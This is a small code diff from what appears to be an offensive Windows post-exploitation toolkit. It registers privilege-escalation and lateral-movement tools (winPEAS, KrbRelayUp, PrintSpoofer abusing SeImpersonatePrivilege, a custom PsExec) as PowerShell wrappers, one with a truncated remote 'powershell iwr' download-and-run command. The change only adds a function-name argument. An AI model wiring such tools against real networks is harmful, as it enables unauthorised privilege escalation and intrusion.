@@ -469,7 +469,7 @@ cs_exe('thirdparty_libs/winPEAS.exe', 'winPEAS', FILENAME='wlpc')
 cs_exe('csharp/myPsExec.exe', 'Invoke-myPsExec appsrv01 SensorDataService "powershell -c `"iwr ...`""', 'myPsExec.Program')
 cs_exe('csharp/SQL.exe', 'Invoke-SQL "<servername>" "<sql>" # separator = `n', 'SQL.SQL')
 cs_exe('thirdparty_libs/KrbRelayUp.exe', 'Invoke-KrbRelayUp')
-cs_exe(getCsExe(wlmgr.getCmd(desc2='myPrintSpoofer')), 'Invoke-PrintSpoofer # Abuse SeImpersonatePrivilege', classname='GG.GGL')
+cs_exe(getCsExe(wlmgr.getCmd(desc2='myPrintSpoofer')), 'Invoke-PrintSpoofer # Abuse SeImpersonatePrivilege', classname='GG.GGL', funcname='Invoke-PrintSpoofer')
 
 for common_psmodule in app['common-pstool']:
     c = ''
